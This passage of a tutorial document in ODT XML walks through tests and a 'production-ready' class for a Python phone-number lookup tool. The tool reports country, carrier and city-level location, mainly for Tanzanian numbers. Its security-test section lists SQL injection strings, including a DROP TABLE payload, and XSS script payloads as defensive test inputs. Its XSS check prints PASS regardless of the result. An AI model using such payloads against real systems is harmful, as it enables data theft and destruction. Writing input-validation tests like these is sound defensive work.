      <text:p text:style-name="P27"><text:s text:c="8"/>self.requests[client_id] = [</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>req_time for req_time in self.requests[client_id]</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>if req_time &gt; window_start</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>]</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Check limit</text:p>
      <text:p text:style-name="P27"><text:soft-page-break/><text:s text:c="8"/>if len(self.requests[client_id]) &gt;= self.max_requests:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>return False</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Add new request</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.requests[client_id].append(now)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>return True</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def get_remaining(self, client_id):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""Get remaining requests for client."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>now = time.time()</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>window_start = now - self.window_seconds</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>recent = sum(1 for t in self.requests[client_id] if t &gt; window_start)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>return max(0, self.max_requests - recent)</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P38">9. Testing</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">9.1 Unit Testing</text:p>
      <text:p text:style-name="P27">File: tests/test_tracker.py</text:p>
      <text:p text:style-name="P27">import unittest</text:p>
      <text:p text:style-name="P27">from unittest.mock import patch, MagicMock</text:p>
      <text:p text:style-name="P27">import sys</text:p>
      <text:p text:style-name="P27">import os</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">from src.core.tracker import PhoneNumberTracker, PhoneNumberInfo</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">class TestPhoneNumberTracker(unittest.TestCase):</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""Unit tests for PhoneNumberTracker."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def setUp(self):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""Set up test fixtures."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.tracker = PhoneNumberTracker(use_online_geocoding=False)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def test_valid_tanzanian_mobile(self):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""Test tracking a valid Tanzanian mobile number."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>result = self.tracker.track("+255712345678")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.assertTrue(result.valid)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.assertEqual(result.country_code, 255)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.assertEqual(result.country_name, "Tanzania")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.assertIn("tiGO", result.carrier_name) <text:s/># Prefix 71 is tiGO</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.assertIn("Africa/Dar_es_Salaam", result.timezones)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def test_valid_tanzanian_fixed_line(self):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""Test tracking a valid Tanzanian fixed line number."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Dar es Salaam area code 22</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>result = self.tracker.track("+255221234567")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.assertTrue(result.valid)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.assertEqual(result.country_code, 255)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.assertEqual(result.country_name, "Tanzania")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.assertIsNone(result.carrier_name) <text:s/># Fixed lines have no carrier</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.assertIn("Dar es Salaam", result.location)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def test_invalid_number_format(self):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""Test handling of invalid number format."""</text:p>
      <text:p text:style-name="P27"><text:soft-page-break/><text:s text:c="8"/>result = self.tracker.track("0712345678") <text:s/># Missing country code</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.assertFalse(result.valid)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def test_nonexistent_number(self):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""Test handling of valid format but invalid number."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Valid format but not a real number</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>result = self.tracker.track("+255999999999")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.assertFalse(result.valid)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>@patch('src.core.geocoder.get_coordinates_from_location')</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def test_coordinate_fallback(self, mock_geocoder):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""Test fallback to hardcoded coordinates when online fails."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>mock_geocoder.return_value = None <text:s/># Simulate online failure</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>result = self.tracker.track("+255712345678")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Should still have coordinates from fallback database</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.assertIsNotNone(result.latitude)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.assertIsNotNone(result.longitude)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def test_number_type_detection(self):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""Test detection of number types."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>mobile = self.tracker.track("+255712345678")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.assertEqual(mobile.number_type, "Mobile")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Toll-free number</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>tollfree = self.tracker.track("+255800123456")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.assertEqual(tollfree.number_type, "Toll Free")</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">if __name__ == '__main__':</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>unittest.main()</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">9.2 Integration Testing</text:p>
      <text:p text:style-name="P27">File: tests/test_integration.py</text:p>
      <text:p text:style-name="P27">import unittest</text:p>
      <text:p text:style-name="P27">import requests</text:p>
      <text:p text:style-name="P27">import json</text:p>
      <text:p text:style-name="P27">import time</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">class TestAPIEndpoints(unittest.TestCase):</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""Integration tests for API endpoints."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>BASE_URL = "http://localhost:5000/api/v1"</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def setUp(self):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""Wait for server to be ready."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>time.sleep(2)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def test_track_endpoint(self):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""Test the main tracking endpoint."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>response = requests.post(</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>f"{self.BASE_URL}/track",</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>json={"phone_number": "+255712345678"}</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.assertEqual(response.status_code, 200)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>data = response.json()</text:p>
      <text:p text:style-name="P27"><text:soft-page-break/><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.assertTrue(data['valid'])</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.assertEqual(data['country_code'], 255)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.assertEqual(data['country_name'], "Tanzania")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def test_bulk_endpoint(self):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""Test bulk tracking endpoint."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>numbers = ["+255712345678", "+255752345678", "+255652345678"]</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>response = requests.post(</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>f"{self.BASE_URL}/bulk",</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>json={"numbers": numbers}</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.assertEqual(response.status_code, 200)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>data = response.json()</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.assertEqual(len(data['results']), 3)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def test_rate_limiting(self):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""Test rate limiting functionality."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Make many requests quickly</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>for i in range(10):</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>response = requests.post(</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>f"{self.BASE_URL}/track",</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>json={"phone_number": f"+25571234567{i}"}</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>if i &lt; 5: <text:s/># First 5 should succeed</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>self.assertEqual(response.status_code, 200)</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>else: <text:s/># After limit, should be rate limited</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>self.assertEqual(response.status_code, 429)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def test_invalid_input(self):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""Test handling of invalid input."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>response = requests.post(</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>f"{self.BASE_URL}/track",</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>json={"phone_number": "invalid"}</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.assertEqual(response.status_code, 400)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.assertIn("error", response.json())</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P4">9.3 Performance Testing</text:p>
      <text:p text:style-name="P27">import time</text:p>
      <text:p text:style-name="P27">import statistics</text:p>
      <text:p text:style-name="P27">from concurrent.futures import ThreadPoolExecutor, as_completed</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">def performance_test():</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""Measure response times under load."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>tracker = PhoneNumberTracker()</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>test_numbers = [</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"+255712345678",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"+255752345678",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"+255652345678",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"+255742345678",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"+255762345678",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"+255222345678",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"+255242345678",</text:p>
      <text:p text:style-name="P27"><text:soft-page-break/><text:s text:c="8"/>"+255262345678",</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>] * 100 <text:s/># 800 total requests</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def track_with_metrics(number):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>start = time.time()</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>result = tracker.track(number)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>duration = time.time() - start</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>return duration, result.valid</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Run concurrent requests</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>latencies = []</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>successes = 0</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>with ThreadPoolExecutor(max_workers=20) as executor:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>futures = [executor.submit(track_with_metrics, num) for num in test_numbers]</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>for future in as_completed(futures):</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>latency, valid = future.result()</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>latencies.append(latency)</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>if valid:</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>successes += 1</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Calculate metrics</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>print(f"Total requests: {len(test_numbers)}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>print(f"Success rate: {successes/len(test_numbers)*100:.1f}%")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>print(f"Average latency: {statistics.mean(latencies)*1000:.2f} ms")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>print(f"Median latency: {statistics.median(latencies)*1000:.2f} ms")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>print(f"95th percentile: {sorted(latencies)[int(len(latencies)*0.95)]*1000:.2f} ms")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>print(f"Max latency: {max(latencies)*1000:.2f} ms")</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P4">9.4 Security Testing</text:p>
      <text:p text:style-name="P27">def security_test():</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""Test for common security vulnerabilities."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>tracker = PhoneNumberTracker()</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Test 1: SQL Injection (if using database)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>malicious_inputs = [</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"' OR '1'='1",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"'; DROP TABLE users; --",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"' UNION SELECT * FROM passwords--",</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>]</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>for malicious in malicious_inputs:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>result = tracker.track(f"+255{malicious}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Should handle gracefully, not crash</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>print(f"SQL injection test '{malicious[:20]}...': {'PASS' if not result.valid else 'FAIL'}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Test 2: XSS attempts</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>xss_inputs = [</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"&lt;script&gt;alert('XSS')&lt;/script&gt;",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"&lt;img src=x onerror=alert(1)&gt;",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"javascript:alert('XSS')",</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>]</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>for xss in xss_inputs:</text:p>
      <text:p text:style-name="P27"><text:soft-page-break/><text:s text:c="8"/>result = tracker.track(f"+255{xss}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Should not execute in logs or output</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>print(f"XSS test '{xss[:20]}...': PASS")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Test 3: Rate limiting bypass attempts</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>print("\nTesting rate limiting...")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Implementation would check if rate limiter can be bypassed</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Test 4: Information disclosure</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>print("\nChecking for information disclosure in error messages...")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Errors should not reveal internal details</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">10. Final Working Example</text:p>
      <text:p text:style-name="Preformatted_20_Text">Here's a complete, production-ready example that combines everything we've discussed:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">File:</text:span> complete_example.py</text:p>
      <text:p text:style-name="P27">#!/usr/bin/env python3</text:p>
      <text:p text:style-name="P27">"""</text:p>
      <text:p text:style-name="P27">Complete working example of J Phone NoTracker</text:p>
      <text:p text:style-name="P27">Demonstrates all features with proper error handling, logging, and security.</text:p>
      <text:p text:style-name="P27">"""</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">import os</text:p>
      <text:p text:style-name="P27">import sys</text:p>
      <text:p text:style-name="P27">import logging</text:p>
      <text:p text:style-name="P27">import json</text:p>
      <text:p text:style-name="P27">from datetime import datetime</text:p>
      <text:p text:style-name="P27">from typing import Optional, Dict, Any</text:p>
      <text:p text:style-name="P27">import argparse</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"># Add project root to path</text:p>
      <text:p text:style-name="P27">sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"># Core imports</text:p>
      <text:p text:style-name="P27">from src.core.tracker import PhoneNumberTracker, PhoneNumberInfo</text:p>
      <text:p text:style-name="P27">from src.utils.validators import sanitize_phone_number, validate_phone_number</text:p>
      <text:p text:style-name="P27">from src.utils.logger import setup_logging</text:p>
      <text:p text:style-name="P27">from src.data.city_centers import CITY_CENTERS</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"># Security imports</text:p>
      <text:p text:style-name="P27">import hashlib</text:p>
      <text:p text:style-name="P27">import hmac</text:p>
      <text:p text:style-name="P27">from functools import wraps</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">class SecurePhoneTracker:</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>Production-ready phone tracker with security features.</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def __init__(self, api_key: Optional[str] = None, offline_mode: bool = False):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>Initialize secure tracker.</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>Args:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>api_key: API key for authentication</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>offline_mode: If True, use only offline databases</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.api_key = api_key</text:p>
      <text:p text:style-name="P27"><text:soft-page-break/><text:s text:c="8"/>self.offline_mode = offline_mode</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Initialize tracker</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.tracker = PhoneNumberTracker(</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>use_online_geocoding=not offline_mode,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>cache_results=True</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Setup logging</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.logger = setup_logging(</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>log_dir="logs",</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>log_file="secure_tracker.log",</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>level=logging.INFO</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Rate limiting</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>from collections import defaultdict</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>import time</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.request_log = defaultdict(list)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.rate_limit = 100 <text:s/># requests per hour</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.rate_window = 3600 <text:s/># 1 hour in seconds</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.logger.info("SecurePhoneTracker initialized (offline_mode={})".format(offline_mode))</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def authenticate(self, provided_key: str) -&gt; bool:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>Authenticate API key using constant-time comparison.</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>Args:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>provided_key: API key to check</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>Returns:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>True if authenticated</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>if not self.api_key:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>return True <text:s/># No authentication required</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Constant-time comparison to prevent timing attacks</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>return hmac.compare_digest(provided_key, self.api_key)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def check_rate_limit(self, client_id: str) -&gt; bool:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>Check if client is within rate limits.</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>Args:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>client_id: Client identifier (IP address or user ID)</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>Returns:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>True if request allowed</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>now = datetime.now().timestamp()</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>window_start = now - self.rate_window</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Clean old requests</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.request_log[client_id] = [</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>t for t in self.request_log[client_id]</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>if t &gt; window_start</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>]</text:p>
      <text:p text:style-name="P27"><text:soft-page-break/><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Check limit</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>if len(self.request_log[client_id]) &gt;= self.rate_limit:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>self.logger.warning(f"Rate limit exceeded for {client_id}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>return False</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Log this request</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.request_log[client_id].append(now)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>return True</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def track_phone(self, phone_number: str, client_id: str = "unknown") -&gt; Dict[str, Any]:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>Track a phone number with full security and logging.</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>Args:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>phone_number: Phone number to track</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>client_id: Client identifier for rate limiting</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>Returns:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>Dictionary with results and metadata</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""</text:p>
